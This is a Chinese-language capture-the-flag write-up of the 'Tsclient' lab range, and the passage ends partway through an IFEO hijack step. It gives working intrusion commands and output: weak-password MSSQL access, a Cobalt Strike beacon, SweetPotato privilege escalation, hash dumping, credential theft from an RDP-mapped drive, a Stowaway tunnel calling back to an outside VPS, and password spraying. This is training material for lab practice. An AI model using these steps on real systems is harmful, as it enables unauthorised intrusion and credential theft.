{"pageProps":{"postData":{"id":"春秋云镜Tsclient","contentHtml":"<h1>Tsclient</h1>\n<blockquote>\n<p><a href=\"https://yunjing.ichunqiu.com/major/detail/1072?type=1\">https://yunjing.ichunqiu.com/major/detail/1072?type=1</a> |</p>\n</blockquote>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image13.png\" alt=\"image.png\"></p>\n<p>分几次打，外网IP为：<code>39.98.110.115</code>，<code>39.99.143.130</code> 等…</p>\n<h2>前期踩点</h2>\n<p>直接 <code>fscan</code> 扫一波</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  ./fscan -h 39.98.110.115\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-03-21 07:04:17] [INFO] 暴力破解线程数: 1\n[2025-03-21 07:04:17] [INFO] 开始信息扫描\n[2025-03-21 07:04:17] [INFO] 最终有效主机数量: 1\n[2025-03-21 07:04:17] [INFO] 开始主机扫描\n[2025-03-21 07:04:17] [INFO] 有效端口数量: 233\n[2025-03-21 07:04:17] [SUCCESS] 端口开放 39.98.110.115:110\n[2025-03-21 07:04:17] [SUCCESS] 端口开放 39.98.110.115:1433\n[2025-03-21 07:04:17] [SUCCESS] 端口开放 39.98.110.115:80\n[2025-03-21 07:04:19] [SUCCESS] 服务识别 39.98.110.115:110 => \n[2025-03-21 07:04:22] [SUCCESS] 服务识别 39.98.110.115:1433 => [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]\n[2025-03-21 07:04:22] [SUCCESS] 服务识别 39.98.110.115:80 => [http]\n[2025-03-21 07:04:27] [INFO] 存活端口数量: 3\n[2025-03-21 07:04:27] [INFO] 开始漏洞扫描\n[2025-03-21 07:04:27] [INFO] 加载的插件: mssql, pop3, webpoc, webtitle\n[2025-03-21 07:04:27] [SUCCESS] 网站标题 http://39.98.110.115      状态码:200 长度:703    标题:IIS Windows Server\n[2025-03-21 07:04:40] [SUCCESS] MSSQL 39.98.110.115:1433 sa 1qaz!QAZ\n</span></code></pre>\n<p>直接给<code>MSSQL</code>弱密码给干出来了<code>1qaz!QAZ</code></p>\n<h2>MSSQL 利用</h2>\n<p>直接使用<code>MDUT</code>进行利用，直接<code>Getshell</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image14.png\" alt=\"image.png\"></p>\n<p>在文件管理处上传 CS 马到 <code>C:/迅雷下载/</code>，运行上线 CS</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image15.png\" alt=\"image.png\"></p>\n<p>执行后可以看到上线CS了</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image16.png\" alt=\"image.png\"></p>\n<h2>SweetPotato</h2>\n<p>上线后我们将要进行提权，方便后面操作</p>\n<p>尝试使用<code>SweetPotato</code>进行提权，工具链接：<a href=\"https://github.com/uknowsec/SweetPotato\">https://github.com/uknowsec/SweetPotato</a> （使用 CS 上的甜土豆插件不能正常使用）</p>\n<p>上传后进行测试，成功回显，并且是管理员权限</p>\n<pre><code class=\"hljs language-bash\">C:/迅雷下载/SweetPotato.exe -a <span class=\"hljs-built_in\">whoami</span>\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image17.png\" alt=\"image.png\"></p>\n<p>通过甜土豆运行之前上传的 CS 马</p>\n<pre><code class=\"hljs language-bash\">C:/迅雷下载/SweetPotato.exe -a <span class=\"hljs-string\">\"C:/迅雷下载/beacon_x64.exe\"</span>\n</code></pre>\n<p>这样就能收到 <code>SYSTEM beacon</code> 了</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image18.png\" alt=\"image.png\"></p>\n<p>能通过当前 <code>shell</code> 来获得 <code>flag1</code></p>\n<pre><code class=\"hljs language-bash\">beacon> shell <span class=\"hljs-built_in\">type</span> C:\\<span class=\"hljs-built_in\">users</span>\\administrator\\flag\\flag01.txt\n[*] Tasked beacon to run: <span class=\"hljs-built_in\">type</span> C:\\<span class=\"hljs-built_in\">users</span>\\administrator\\flag\\flag01.txt\n[+] host called home, sent: 74 bytes\n[+] received output:\n _________  ________  ________  ___       ___  _______   ________   _________   \n|\\___   ___\\\\   ____\\|\\   ____\\|\\  \\     |\\  \\|\\  ___ \\ |\\   ___  \\|\\___   ___\\ \n\\|___ \\  \\_\\ \\  \\___|\\ \\  \\___|\\ \\  \\    \\ \\  \\ \\   __/|\\ \\  \\\\ \\  \\|___ \\  \\_| \n     \\ \\  \\ \\ \\_____  \\ \\  \\    \\ \\  \\    \\ \\  \\ \\  \\_|/_\\ \\  \\\\ \\  \\   \\ \\  \\  \n      \\ \\  \\ \\|____|\\  \\ \\  \\____\\ \\  \\____\\ \\  \\ \\  \\_|\\ \\ \\  \\\\ \\  \\   \\ \\  \\ \n       \\ \\__\\  ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\   \\ \\__\\\n        \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__|    \\|__|\n              \\|_________|                                                      \n\nGetting flag01 is easy, right?\nflag01: flag{19ee19b2-51de-456d-9f5f-814139df9aed}\nMaybe you should focus on user sessions...\n</code></pre>\n<p>提示：Maybe you should focus on user sessions...  也许你应该关注用户会话...…</p>\n<h2>信息收集 - 1</h2>\n<p>根据提示查看用户等信息，存在一个<code>John</code>用户</p>\n<pre><code class=\"hljs language-bash\">beacon> shell net user\n[*] Tasked beacon to run: net user\n[+] host called home, sent: 39 bytes\n[+] received output:\n\n\\\\ 的用户帐户\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest                    \nJohn                     \n命令运行完毕，但发生一个或多个错误。\n</code></pre>\n<p>并且该主机不是域内主机</p>\n<pre><code class=\"hljs language-bash\">beacon> shell net view /domain\n[*] Tasked beacon to run: net view /domain\n[+] host called home, sent: 47 bytes\n[+] received output:\n发生系统错误 6118。\n\n此工作组的服务器列表当前无法使用\n</code></pre>\n<p>因为我们是SYSTEM权限，所以可以直接<code>Dump HASH</code></p>\n<pre><code class=\"hljs language-bash\">beacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJohn:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::\n</code></pre>\n<p>打开进程列表，查看是否存在 John 用户起的进程</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image19.png\" alt=\"image.png\"></p>\n<p>我们选择一个进行注入，注入后会多出来新的会话</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image20.png\" alt=\"image.png\"></p>\n<p>进行会话交互，进行信息收集</p>\n<p>发现在在共享文件夹中可以发现一个与靶场名称相同的共享文件夹（<strong>远程桌面重定向（RDP 文件夹映射）</strong>，也叫 <strong>远程桌面剪贴板共享</strong>）</p>\n<pre><code class=\"hljs language-bash\">beacon> shell net use\n[*] Tasked beacon to run: net use\n[+] host called home, sent: 38 bytes\n[+] received output:\n会记录新的网络连接。\n\n状态       本地        远程                      网络\n\n-------------------------------------------------------------------------------\n                       \\\\TSCLIENT\\C              Microsoft Terminal Services\n命令成功完成。\n\nbeacon> shell <span class=\"hljs-built_in\">dir</span> \\\\TSCLIENT\\c\n[*] Tasked beacon to run: <span class=\"hljs-built_in\">dir</span> \\\\TSCLIENT\\c\n[+] host called home, sent: 47 bytes\n[+] received output:\n 驱动器 \\\\TSCLIENT\\c 中的卷没有标签。\n 卷的序列号是 C2C5-9D0C\n\n \\\\TSCLIENT\\c 的目录\n\n2022/07/12  10:34                71 credential.txt\n2022/05/12  17:04    &#x3C;DIR>          PerfLogs\n2022/07/11  12:53    &#x3C;DIR>          Program Files\n2022/05/18  11:30    &#x3C;DIR>          Program Files (x86)\n2022/07/11  12:47    &#x3C;DIR>          Users\n2022/07/11  12:45    &#x3C;DIR>          Windows\n               1 个文件             71 字节\n               5 个目录 30,037,798,912 可用字节\n</code></pre>\n<p>可以发现存在令人感兴趣的 <code>credential.txt</code> ，读取</p>\n<pre><code class=\"hljs language-bash\">beacon> shell <span class=\"hljs-built_in\">type</span> \\\\TSCLIENT\\C\\credential.txt\n[*] Tasked beacon to run: <span class=\"hljs-built_in\">type</span> \\\\TSCLIENT\\C\\credential.txt\n[+] host called home, sent: 63 bytes\n[+] received output:\nxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\n\nDo you know how to hijack Image?\n</code></pre>\n<p>得到一组用户名和密码<code>Aldrich:Ald@rLMWuy7Z!#</code> （后面可以用于密码喷洒） ，并且能知道域是<code>xiaorang.lab</code> ，还有一个提示：<code>Do you know how to hijack Image?</code></p>\n<p>我们再继续对内网信息进行收集</p>\n<p>得到内网网段<code>172.22.8.0</code></p>\n<pre><code class=\"hljs language-bash\">beacon> shell ipconfig\n[*] Tasked beacon to run: ipconfig\n[+] host called home, sent: 39 bytes\n[+] received output:\n\nWindows IP 配置\n\n以太网适配器 以太网:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   本地链接 IPv6 地址. . . . . . . . : fe80::b4f9:abb7:52c4:b6ca%14\n   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18\n   子网掩码  . . . . . . . . . . . . : 255.255.0.0\n   默认网关. . . . . . . . . . . . . : 172.22.255.253\n\n隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开连接\n   连接特定的 DNS 后缀 . . . . . . . : \n\n隧道适配器 Teredo Tunneling Pseudo-Interface:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:244b:245c:d89d:918c\n   本地链接 IPv6 地址. . . . . . . . : fe80::244b:245c:d89d:918c%12\n   默认网关. . . . . . . . . . . . . : ::\n</code></pre>\n<h2>搭建隧道</h2>\n<p>我们需要对内网进行 <code>fscan</code> 扫描，需要进行搭建内网隧道才能访问到内网网段（通过 CS 运行也可以，但是后面也是要进行搭建的）</p>\n<p>使用<code>stowaway</code>来搭建</p>\n<p>首先上传<code>agent</code>到靶机</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image21.png\" alt=\"image.png\"></p>\n<p>如何在VPS上运行</p>\n<pre><code class=\"hljs language-bash\">[root@ admin]# ./linux_x64_admin -l 1081 -s 123\n</code></pre>\n<p>通过 CS 在靶机上运行</p>\n<pre><code class=\"hljs language-bash\">beacon> shell C:\\windows_x64_agent.exe -c 8.134.163.255:1081 -s 123 -reconnect 8\n</code></pre>\n<p>运行后在VPS上能收到</p>\n<pre><code class=\"hljs language-bash\">[*] Starting admin node on port 1081\n\n    .-<span class=\"hljs-string\">')    .-'</span>) _                  (<span class=\"hljs-string\">'\\ .-'</span>) /<span class=\"hljs-string\">'  ('</span>-.      (<span class=\"hljs-string\">'\\ .-'</span>) /<span class=\"hljs-string\">'  ('</span>-.\n   ( OO ). (  OO) )                  <span class=\"hljs-string\">'.( OO ),'</span> ( OO ).-.   <span class=\"hljs-string\">'.( OO ),'</span> ( OO ).-.\n   (_)---\\_)/     <span class=\"hljs-string\">'._  .-'</span>),-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.\n   /    _ | |<span class=\"hljs-string\">'--...__)( OO'</span>  .-.  <span class=\"hljs-string\">'|      |  |   | \\-.  \\ |      |  |   | \\-.  \\    \\  '</span>.<span class=\"hljs-string\">'  /\n   \\  :'</span> <span class=\"hljs-string\">'. '</span>--.  .--<span class=\"hljs-string\">'/   |  | |  ||  |   |  |,.-'</span>-<span class=\"hljs-string\">'  |  ||  |   |  |,.-'</span>-<span class=\"hljs-string\">'  |  | .-'</span>)     /\n    <span class=\"hljs-string\">'..'</span><span class=\"hljs-string\">''</span>.)   |  |   \\_) |  |\\|  ||  |.<span class=\"hljs-string\">'.|  |_)\\| |_.'</span>  ||  |.<span class=\"hljs-string\">'.|  |_)\\| |_.'</span>  |(OO  \\   /\n   .-._)   \\   |  |     \\ |  | |  ||         |   |  .-.  ||         |   |  .-.  | |   /  /\\_\n   \\       /   |  |      <span class=\"hljs-string\">''</span>  <span class=\"hljs-string\">'-'</span>  <span class=\"hljs-string\">'|   ,'</span>.   |   |  | |  ||   ,<span class=\"hljs-string\">'.   |   |  | |  | '</span>-./  /.__)    \n   <span class=\"hljs-string\">'-----'</span>    <span class=\"hljs-string\">'--'</span>        <span class=\"hljs-string\">'-----'</span> <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span> <span class=\"hljs-string\">'--'</span><span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span> <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>\n                                    { v2.2  Author:ph4ntom }\n[*] Waiting <span class=\"hljs-keyword\">for</span> new connection...\n[*] Connection from node 39.99.143.130:51397 is <span class=\"hljs-built_in\">set</span> up successfully! Node <span class=\"hljs-built_in\">id</span> is 0\n(admin) >> \n</code></pre>\n<p>VPS 在1080端口上开启<code>socks</code>代理服务器</p>\n<pre><code class=\"hljs language-bash\">(admin) >> detail\nNode[0] -> IP: 39.99.143.130:51397  Hostname: WIN-WEB  User: nt authority\\system\nMemo: \n\n(admin) >> use 0\n(node 0) >> <span class=\"hljs-built_in\">help</span>\n        <span class=\"hljs-built_in\">help</span>                                            Show <span class=\"hljs-built_in\">help</span> information\n        status                                          Show node status,including socks/forward/backward\n        listen                                          Start port listening on current node\n        addmemo    &#x3C;string>                             Add memo <span class=\"hljs-keyword\">for</span> current node\n        delmemo                                         Delete memo of current node\n        ssh        &#x3C;ip:port>                            Start SSH through current node\n        shell                                           Start an interactive shell on current node\n        socks      &#x3C;lport> [username] [pass]            Start a socks5 server\n        stopsocks                                       Shut down socks services\n        connect    &#x3C;ip:port>                            Connect to a new node\n        sshtunnel  &#x3C;ip:sshport> &#x3C;agent port>            Use sshtunnel to add the node into our topology\n        upload     &#x3C;<span class=\"hljs-built_in\">local</span> filename> &#x3C;remote filename>   Upload file to current node\n        download   &#x3C;remote filename> &#x3C;<span class=\"hljs-built_in\">local</span> filename>   Download file from current node\n        forward    &#x3C;lport> &#x3C;ip:port>                    Forward <span class=\"hljs-built_in\">local</span> port to specific remote ip:port\n        stopforward                                     Shut down forward services\n        backward    &#x3C;rport> &#x3C;lport>                     Backward remote port(agent) to <span class=\"hljs-built_in\">local</span> port(admin)\n        stopbackward                                    Shut down backward services\n        shutdown                                        Terminate current node\n        back                                            Back to parent panel\n        <span class=\"hljs-built_in\">exit</span>                                            Exit Stowaway\n  \n(node 0) >> socks 1080 admin admin\n[*] Trying to listen on 0.0.0.0:1080......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<p><code>kali</code> 进行连接，首先修改<code>proxychains.conf</code></p>\n<pre><code class=\"hljs language-bash\">[ProxyList]\n<span class=\"hljs-comment\"># add proxy here ...</span>\n<span class=\"hljs-comment\"># meanwile</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># defaults set to \"tor\"</span>\nsocks5  8.134.163.255   1080    admin   admin\n</code></pre>\n<p>测试是否成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Tsclient  proxychains4 curl 172.22.8.18\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.8.18:80  ...  OK\n&#x3C;!DOCTYPE html PUBLIC <span class=\"hljs-string\">\"-//W3C//DTD XHTML 1.0 Strict//EN\"</span> <span class=\"hljs-string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"</span>>\n&#x3C;html xmlns=<span class=\"hljs-string\">\"http://www.w3.org/1999/xhtml\"</span>>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n&#x3C;meta http-equiv=<span class=\"hljs-string\">\"Content-Type\"</span> content=<span class=\"hljs-string\">\"text/html; charset=iso-8859-1\"</span> />\n&#x3C;title>IIS Windows Server&#x3C;/title>\n&#x3C;style <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span>>\n&#x3C;!--\nbody {\n        color:#000000;\n        background-color:#0072C6;\n        margin:0;\n}\n\n<span class=\"hljs-comment\">#container {</span>\n        margin-left:auto;\n        margin-right:auto;\n        text-align:center;\n        }\n\na img {\n        border:none;\n}\n\n-->\n&#x3C;/style>\n&#x3C;/head>\n&#x3C;body>\n&#x3C;div <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"container\"</span>>\n&#x3C;a href=<span class=\"hljs-string\">\"http://go.microsoft.com/fwlink/?linkid=66138&#x26;amp;clcid=0x409\"</span>>&#x3C;img src=<span class=\"hljs-string\">\"iisstart.png\"</span> alt=<span class=\"hljs-string\">\"IIS\"</span> width=<span class=\"hljs-string\">\"960\"</span> height=<span class=\"hljs-string\">\"600\"</span> />&#x3C;/a>\n&#x3C;/div>\n&#x3C;/body>\n&#x3C;/html>#                                                                                                          \n</code></pre>\n<h2>信息收集 - 2</h2>\n<p>上传 fscan 到靶机进行扫描</p>\n<pre><code class=\"hljs language-bash\">beacon> shell C:\\fscan.exe -h 172.22.8.0/24\n\n╔════════════════════════════════════════════════════════╗\n║    ___                              _                 ║\n║   / _ \\     ___  ___ _ __ __ _  ___| | __            ║\n║  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /            ║\n║ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;             ║\n║ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\            ║\n╚════════════════════════════════════════════════════════╝\n      Fscan Version: 2.0.0\n\n[2025-03-22 09:40:14] [INFO] 并发扫描线程数: 1\n[2025-03-22 09:40:14] [INFO] 开始信息收集\n[2025-03-22 09:40:14] [INFO] CIDR范围: 172.22.8.0-172.22.8.255\n[2025-03-22 09:40:14] [INFO] 解析CIDR 172.22.8.0/24 -> IP范围 172.22.8.0-172.22.8.255\n[2025-03-22 09:40:14] [INFO] 可用主机总数: 256\n[2025-03-22 09:40:14] [INFO] 开始主机探测\n[2025-03-22 09:40:14] [SUCCESS] 目标 172.22.8.18     存活 (ICMP)\n[2025-03-22 09:40:17] [SUCCESS] 目标 172.22.8.15     存活 (ICMP)\n[2025-03-22 09:40:17] [SUCCESS] 目标 172.22.8.31     存活 (ICMP)\n[2025-03-22 09:40:17] [SUCCESS] 目标 172.22.8.46     存活 (ICMP)\n[2025-03-22 09:40:17] [INFO] 存活主机数量: 4\n[2025-03-22 09:40:17] [INFO] 有效端口数量: 233\n[2025-03-22 09:40:17] [SUCCESS] 端口开放 172.22.8.15:88\n[2025-03-22 09:40:17] [SUCCESS] 端口开放 172.22.8.46:80\n[2025-03-22 09:40:17] [SUCCESS] 端口开放 172.22.8.18:80\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.15:389\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.46:139\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.31:139\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.15:139\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.31:135\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.46:135\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.18:139\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.15:135\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.18:135\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.31:445\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.46:445\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.15:445\n[2025-03-22 09:40:18] [SUCCESS] 端口开放 172.22.8.18:445\n[2025-03-22 09:40:20] [SUCCESS] 端口开放 172.22.8.18:1433\n\n[+] received output:\n[2025-03-22 09:40:22] [SUCCESS] 服务识别 172.22.8.15:88 => \n[2025-03-22 09:40:23] [SUCCESS] 服务识别 172.22.8.18:80 => [http]\n\n[+] received output:\n[2025-03-22 09:40:23] [SUCCESS] 服务识别 172.22.8.46:80 => [http]\n\n[+] received output:\n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.46:139 =>  Banner:[.]\n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.31:139 =>  Banner:[.]\n\n[+] received output:\n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.15:139 =>  Banner:[.]\n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.18:139 =>  Banner:[.]\n\n[+] received output:\n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.31:445 => \n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.46:445 => \n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.15:445 => \n[2025-03-22 09:40:24] [SUCCESS] 服务识别 172.22.8.18:445 => \n\n[+] received output:\n[2025-03-22 09:40:25] [SUCCESS] 服务识别 172.22.8.18:1433 => [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]\n\n[+] received output:\n[2025-03-22 09:40:28] [SUCCESS] 服务识别 172.22.8.15:389 => \n\n[+] received output:\n[2025-03-22 09:41:24] [SUCCESS] 服务探测 172.22.8.31:135 => \n\n[+] received output:\n[2025-03-22 09:41:24] [SUCCESS] 服务探测 172.22.8.46:135 => \n[2025-03-22 09:41:24] [SUCCESS] 服务探测 172.22.8.15:135 => \n[2025-03-22 09:41:24] [SUCCESS] 服务探测 172.22.8.18:135 => \n[2025-03-22 09:41:24] [INFO] 存活端口数量: 17\n\n[+] received output:\n[2025-03-22 09:41:24] [INFO] 开始主动探测\n[2025-03-22 09:41:24] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-03-22 09:41:24] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.8.31\n主机名: WIN19-CLIENT\n发现的网络接口:\n   IPv4地址:\n      ➤ 172.22.8.31\n[2025-03-22 09:41:24] [SUCCESS] 网站标题 http://172.22.8.46        状态码: 200 长度: 703    标题: IIS Windows Server\n[2025-03-22 09:41:24] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.8.46\n主机名: WIN2016\n发现的网络接口:\n   IPv4地址:\n      ➤ 172.22.8.46\n[2025-03-22 09:41:24] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.8.18\n主机名: WIN-WEB\n发现的网络接口:\n   IPv4地址:\n      ➤ 172.22.8.18\n   IPv6地址:\n      ➤ 2001:0:348b:fb58:18ce:928:d89c:707d\n[2025-03-22 09:41:24] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.8.15\n主机名: DC01\n发现的网络接口:\n   IPv4地址:\n      ➤ 172.22.8.15\n[2025-03-22 09:41:24] [SUCCESS] NetBios 172.22.8.15     DC:XIAORANG\\DC01           \n[2025-03-22 09:41:24] [SUCCESS] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393\n\n[+] received output:\n[2025-03-22 09:41:24] [SUCCESS] NetBios 172.22.8.31     XIAORANG\\WIN19-CLIENT         \n[2025-03-22 09:41:24] [SUCCESS] 网站标题 http://172.22.8.18        状态码: 200 长度: 703    标题: IIS Windows Server\n\n[+] received output:\n[2025-03-22 09:41:25] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ\n\n[+] received output:\n[2025-03-22 09:41:47] [SUCCESS] 扫描已完成: 32/32\n\n</span></code></pre>\n<p><strong>1. 存活主机</strong></p>\n<p>扫描发现了 4 台存活的主机：</p>\n<ul>\n<li><strong>172.22.8.15</strong> (DC01)</li>\n<li><strong>172.22.8.18</strong> (WIN-WEB)</li>\n<li><strong>172.22.8.31</strong> (WIN19-CLIENT)</li>\n<li><strong>172.22.8.46</strong> (WIN2016)</li>\n</ul>\n<p><strong>2. 开放端口</strong></p>\n<p>主要的开放端口如下：</p>\n<ul>\n<li><strong>Web 服务（HTTP）</strong>\n<ul>\n<li><code>172.22.8.18:80</code> (IIS Windows Server)</li>\n<li><code>172.22.8.46:80</code> (IIS Windows Server)</li>\n</ul>\n</li>\n<li><strong>Microsoft SQL Server</strong>\n<ul>\n<li><code>172.22.8.18:1433</code></li>\n<li><strong>成功爆破</strong>：用户名 <code>sa</code>，密码 <code>1qaz!QAZ</code></li>\n</ul>\n</li>\n<li><strong>Windows 相关端口</strong>\n<ul>\n<li><code>88</code> (Kerberos) - <code>172.22.8.15</code></li>\n<li><code>389</code> (LDAP) - <code>172.22.8.15</code></li>\n<li><code>135</code> (RPC) - 多个主机</li>\n<li><code>139, 445</code> (SMB) - 多个主机</li>\n<li><code>139, 445</code> (NetBIOS) - <code>172.22.8.15, 172.22.8.31, 172.22.8.46</code></li>\n</ul>\n</li>\n</ul>\n<p>到这里开始我们能知道**<code>172.22.8.15</code>**是<code>DC</code></p>\n<p>之前通过<code>credential.txt</code> 的到一组用户密码<code>Aldrich:Ald@rLMWuy7Z!#</code> ，我们用其进行密码喷洒</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image22.png\" alt=\"image.png\"></p>\n<p>提示密码过期</p>\n<p>先尝试 RDP，发现<code>31</code> 和 <code>46</code> 可以进行连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image23.png\" alt=\"image.png\"></p>\n<p>输入密码时提示密码过期，但是又不能通过图形化界面修改（无权限）</p>\n<p>通过 <code>smbpasswd</code> 来修改链接：<a href=\"https://github.com/Lex-Case/Impacket/blob/master/examples/smbpasswd.py\">https://github.com/Lex-Case/Impacket/blob/master/examples/smbpasswd.py</a></p>\n<pre><code class=\"hljs language-bash\"> proxychains4 -q python smbpasswd.py xiaorang.lab/<span class=\"hljs-string\">'Aldrich'</span>:<span class=\"hljs-string\">'Ald@rLMWuy7Z!#'</span>@172.22.8.15 -newpass <span class=\"hljs-string\">'sunset2131_'</span>\n\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n===============================================================================\n  Warning: This functionality will be deprecated <span class=\"hljs-keyword\">in</span> the next Impacket version  \n===============================================================================\n\n[!] Password is expired, trying to <span class=\"hljs-built_in\">bind</span> with a null session.\n[*] Password was changed successfully.\n</code></pre>\n<p>再通过<code>RDP</code>来连接，最后<code>31</code>没有远程登陆权限无法登录，<code>46</code>登陆成功</p>\n<p>非常有限的权限，并且机器是不出网的</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image24.png\" alt=\"image.png\"></p>\n<p>先将<code>46</code>上线<code>CS</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image25.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image26.png\" alt=\"image.png\"></p>\n<h2>镜像劫持</h2>\n<p>根据之前的提示：<code>Do you know how to hijack Image?</code> 感觉是要我们进行劫持镜像<code>IFEO</code>进行提权</p>\n<p>打开<code>PowerShell</code></p>\n<pre><code class=\"hljs language-bash\">get-acl -path <span class=\"hljs-string\">\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"</span> | fl *\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image27.png\" alt=\"image.png\"></p>\n<p><code>HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> 这个注册表键的访问权限如下：</p>\n<ul>\n<li><strong>所有者 (Owner)</strong>：<code>NT AUTHORITY\\SYSTEM</code></li>\n<li><strong>组 (Group)</strong>：<code>NT AUTHORITY\\SYSTEM</code></li>\n<li><strong>访问权限 (AccessToString)</strong>：\n<ul>\n<li><code>CREATOR OWNER</code>：完全控制 (<code>FullControl</code>)</li>\n<li><code>Authenticated Users</code>：允许 <code>SetValue</code>、<code>CreateSubKey</code>、<code>ReadKey</code></li>\n<li><code>SYSTEM</code>：完全控制 